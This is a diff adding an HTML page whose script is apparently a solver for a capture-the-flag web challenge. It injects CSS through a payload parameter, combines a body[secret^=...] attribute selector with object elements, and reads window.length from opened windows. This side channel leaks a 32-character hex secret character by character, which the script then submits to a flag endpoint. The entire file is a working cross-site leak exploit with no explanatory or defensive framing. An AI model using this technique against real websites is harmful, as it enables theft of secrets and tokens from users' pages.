@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const TARGET = "https://web"; // The bot sees the challenge as 'web'
+        const HEX = "0123456789abcdef";
+        let leaked = "";
+
+        async function solve() {
+            for (let i = 0; i < 32; i++) {
+                for (let char of HEX) {
+                    let guess = leaked + char;
+                    
+                    // The 'Command' injected into the attribute
+                    let css_cmd = `
+                        <style>
+                            body[secret^="${guess}"] object { display: none; }
+                        </style>
+                        <object data="about:blank"></object>
+                        <object data="about:blank"></object>
+                    `;
+
+                    let win = window.open(`${TARGET}/secret?payload=${encodeURIComponent(css_cmd)}`);
+                    await new Promise(r => setTimeout(r, 600));
+
+                    if (win && win.length === 1) {
+                        leaked += char;
+                        win.close();
+                        break;
+                    }
+                    if (win) win.close();
+                }
+            }
+            // Once the 32-character 'command' is complete, go to the flag
+            window.location.href = `${TARGET}/flag?secret=${leaked}`;
+        }
+        solve();
+    </script>
+</body>
+</html>
